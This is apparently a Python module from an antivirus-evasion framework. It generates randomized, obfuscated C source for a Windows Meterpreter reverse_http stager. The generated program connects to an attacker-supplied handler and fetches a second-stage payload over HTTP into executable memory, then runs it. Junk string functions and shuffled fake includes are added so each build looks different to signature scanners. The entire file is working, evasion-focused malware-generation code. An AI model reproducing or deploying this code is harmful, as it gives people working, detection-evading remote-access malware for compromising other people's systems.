
"""

Obfuscated, pure C windows/meterpreter/reverse_http.

Implements various randomized string processing functions in an
attempt to obfuscate the call tree.
Also compatible with Cobalt-Strike's Beacon.

Original reverse_tcp inspiration from https://github.com/rsmudge/metasploit-loader

Module built by @harmj0y

"""

import random
from modules.common import helpers

class Payload:

    def __init__(self):
        # required options
        self.shortname = "meter_rev_http"
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "c"
        self.extension = "c"
        self.rating = "Excellent"

        # optional
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
                                    "LHOST"          : ["", "IP of the Metasploit handler"],
                                    "LPORT"          : ["8080", "Port of the Metasploit handler"],
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"]
                                }

    def generate(self):

        sumvalue_name = helpers.randomString()
        checksum_name = helpers.randomString()
        winsock_init_name = helpers.randomString()
        punt_name = helpers.randomString()
        wsconnect_name = helpers.randomString()

        # the real includes needed
        includes = [ "#include <stdio.h>" , "#include <stdlib.h>", "#include <windows.h>", "#include <string.h>", "#include <time.h>"]

        # max length string for obfuscation
        global_max_string_length = 10000
        max_string_length = random.randint(100,global_max_string_length)
        max_num_strings = 10000

        # TODO: add in more string processing functions
        randName1 = helpers.randomString() # reverse()
        randName2 = helpers.randomString() # doubles characters
        stringModFunctions = [  (randName1, "char* %s(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\\0'; return t2; }" %(randName1)),
                                (randName2, "char* %s(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\\0'; return result; }" %(randName2))
                            ]

        random.shuffle(stringModFunctions)

        # obfuscation "logical nop" string generation functions
        randString1 = helpers.randomString(50)
        randName1 = helpers.randomString()
        randVar1 = helpers.randomString()
        randName2 = helpers.randomString()
        randVar2 = helpers.randomString()
        randVar3 = helpers.randomString()
        randName3 = helpers.randomString()
        randVar4 = helpers.randomString()
        randVar5 = helpers.randomString()

        stringGenFunctions = [  (randName1, "char* %s(){ char *%s = %s(\"%s\"); return strstr( %s, \"%s\" );}" %(randName1, randVar1, stringModFunctions[0][0], randString1, randVar1, randString1[len(randString1)/2])),
                                (randName2, "char* %s(){ char %s[%s], %s[%s/2]; strcpy(%s,\"%s\"); strcpy(%s,\"%s\"); return %s(strcat( %s, %s)); }" % (randName2, randVar2, max_string_length, randVar3, max_string_length, randVar2, helpers.randomString(50), randVar3, helpers.randomString(50), stringModFunctions[1][0], randVar2, randVar3)),
                                (randName3, "char* %s() { char %s[%s] = \"%s\"; char *%s = strupr(%s); return strlwr(%s); }" % (randName3, randVar4, max_string_length, helpers.randomString(50), randVar5, randVar4, randVar5))
                             ]
        random.shuffle(stringGenFunctions)

        # obfuscation - add in our fake includes
        fake_includes = ["#include <sys/timeb.h>", "#include <time.h>", "#include <math.h>", "#include <signal.h>", "#include <stdarg.h>",
                        "#include <limits.h>", "#include <assert.h>"]
        t = random.randint(1,7)
        for x in xrange(1, random.randint(1,7)):
            includes.append(fake_includes[x])

        # shuffle up real/fake includes
        random.shuffle(includes)

        code = "#define _WIN32_WINNT 0x0500\n"
        code += "#include <winsock2.h>\n"
        code += "\n".join(includes) + "\n"

        #string mod functions
        code += stringModFunctions[0][1] + "\n"
        code += stringModFunctions[1][1] + "\n"

        # build the sumValue function
        string_arg_name = helpers.randomString()
        retval_name = helpers.randomString()
        code += "int %s(char %s[]) {" % (sumvalue_name, string_arg_name)
        code += "int %s=0; int i;" %(retval_name)
        code += "for (i=0; i<strlen(%s);++i) %s += %s[i];" %(string_arg_name, retval_name, string_arg_name)
        code += "return (%s %% 256);}\n" %(retval_name)

        # build the winsock_init function
        wVersionRequested_name = helpers.randomString()
        wsaData_name = helpers.randomString()
        code += "void %s() {" % (winsock_init_name)
        code += "WORD %s = MAKEWORD(%s, %s); WSADATA %s;" % (wVersionRequested_name, helpers.obfuscateNum(2,4), helpers.obfuscateNum(2,4), wsaData_name)
        code += "if (WSAStartup(%s, &%s) < 0) { WSACleanup(); exit(1);}}\n" %(wVersionRequested_name,wsaData_name)

        # first logical nop string function
        code += stringGenFunctions[0][1] + "\n"

        # build punt function
        my_socket_name = helpers.randomString()
        code += "void %s(SOCKET %s) {" %(punt_name, my_socket_name)
        code += "closesocket(%s);" %(my_socket_name)
        code += "WSACleanup();"
        code += "exit(1);}\n"

        # second logical nop string function
        code += stringGenFunctions[1][1] + "\n"

        # build the reverse_http uri checksum function
        randchars = ''.join(random.sample("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",62))
        characters_name = helpers.randomString()
        string_var_name = helpers.randomString()
        code += "char* %s(){" %(checksum_name)
        code += "srand (time(NULL));int i;"
        code += "char %s[] = \"%s\";" %(characters_name, randchars)
        code += "char* %s = malloc(5); %s[4] = 0;" %(string_var_name, string_var_name)
        code += "while (1<2){for(i=0;i<3;++i){%s[i] = %s[rand() %% (sizeof(%s)-1)];}" %(string_var_name, characters_name, characters_name)
        code += "for(i=0;i<sizeof(%s);i++){ %s[3] = %s[i];" % (characters_name, string_var_name, characters_name)
        code += "if (%s(%s) == 92) return %s; } } return 0;}\n" % (sumvalue_name,string_var_name,string_var_name)

        # third logical nop string function
        code += stringGenFunctions[2][1] + "\n"

        # build wsconnect function
        target_name = helpers.randomString()
        sock_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        code += "SOCKET %s() { struct hostent * %s; struct sockaddr_in %s; SOCKET %s;" % (wsconnect_name, target_name, sock_name, my_socket_name)
        code += "%s = socket(AF_INET, SOCK_STREAM, 0);" %(my_socket_name)
        code += "if (%s == INVALID_SOCKET) %s(%s);" %(my_socket_name, punt_name, my_socket_name);
        code += "%s = gethostbyname(\"%s\");" %(target_name, self.required_options["LHOST"][0])
        code += "if (%s == NULL) %s(%s);" %(target_name, punt_name, my_socket_name)
        code += "memcpy(&%s.sin_addr.s_addr, %s->h_addr, %s->h_length);" %(sock_name, target_name, target_name)
        code += "%s.sin_family = AF_INET;" %(sock_name)
        code += "%s.sin_port = htons(%s);" %(sock_name, helpers.obfuscateNum(int(self.required_options["LPORT"][0]),32))
        code += "if ( connect(%s, (struct sockaddr *)&%s, sizeof(%s)) ) %s(%s);" %(my_socket_name, sock_name, sock_name, punt_name, my_socket_name)
        code += "return %s;}\n" %(my_socket_name)

        # build main() code
        size_name = helpers.randomString()
        buffer_name = helpers.randomString()
        function_name = helpers.randomString()
        my_socket_name = helpers.randomString()
        count_name = helpers.randomString()
        request_buf_name = helpers.randomString()
        buf_counter_name = helpers.randomString()
        bytes_read_name = helpers.randomString()

        # obfuscation stuff
        char_array_name_1 = helpers.randomString()
        number_of_strings_1 = random.randint(1,max_num_strings)
        char_array_name_2 = helpers.randomString()
        number_of_strings_2 = random.randint(1,max_num_strings)
        char_array_name_3 = helpers.randomString()
        number_of_strings_3 = random.randint(1,max_num_strings)

        # main method code
        code += "int main(int argc, char * argv[]) {"
        code += "char * %s; int i;" %(buffer_name)

        # obfuscation
        code += "char* %s[%s];" % (char_array_name_1, number_of_strings_1)

        # malloc our first string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_1, char_array_name_1, random.randint(max_string_length,global_max_string_length))

        # call the winsock init function
        code += "%s();" %(winsock_init_name)

        # obfuscation
        code += "char* %s[%s];" % (char_array_name_2, number_of_strings_2)

        # create our socket
        code += "SOCKET %s = %s();" %(my_socket_name,wsconnect_name)

        # malloc our second string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_2, char_array_name_2, random.randint(max_string_length,global_max_string_length))

        # build and send the HTTP request to the handler
        code += "char %s[200];" %(request_buf_name)
        code += "sprintf(%s, \"GET /%%s HTTP/1.1\\r\\nAccept-Encoding: identity\\r\\nHost: %s:%s\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT\\r\\n\\r\\n\", %s());" %(request_buf_name, self.required_options["LHOST"][0], self.required_options["LPORT"][0], checksum_name)
        code += "send(%s,%s, strlen( %s ),0);" %(my_socket_name, request_buf_name, request_buf_name)
        code += "Sleep(300);"

        # TODO: obfuscate/randomize the size of the page allocated
        code += "%s = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" %(buffer_name)
        code += "char* %s[%s];" % (char_array_name_3, number_of_strings_3)

        # first string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_1, char_array_name_1, stringGenFunctions[0][0])

        # read the full server response into the buffer
        code += "char * %s = %s;" % (buf_counter_name,buffer_name)
        code += "int %s; do {" % (bytes_read_name)
        code += "%s = recv(%s, %s, 1024, 0);" % (bytes_read_name, my_socket_name, buf_counter_name)
        code += "%s += %s; }" % (buf_counter_name,bytes_read_name)
        code += "while ( %s > 0 );" % (bytes_read_name)

        # malloc our third string obfuscation array
        code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_3, char_array_name_3, random.randint(max_string_length,global_max_string_length))

        # second string obfuscation method
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_2, char_array_name_2, stringGenFunctions[1][0])

        # real code
        code += "closesocket(%s); WSACleanup();" %(my_socket_name)
        code += "((void (*)())strstr(%s, \"\\r\\n\\r\\n\") + 4)();" %(buffer_name)

        # third string obfuscation method (never called)
        code += "for (i=0; i<%s; ++i){strcpy(%s[i], %s());}" %(number_of_strings_3, char_array_name_3, stringGenFunctions[2][0])
        code += "return 0;}\n"

        return code
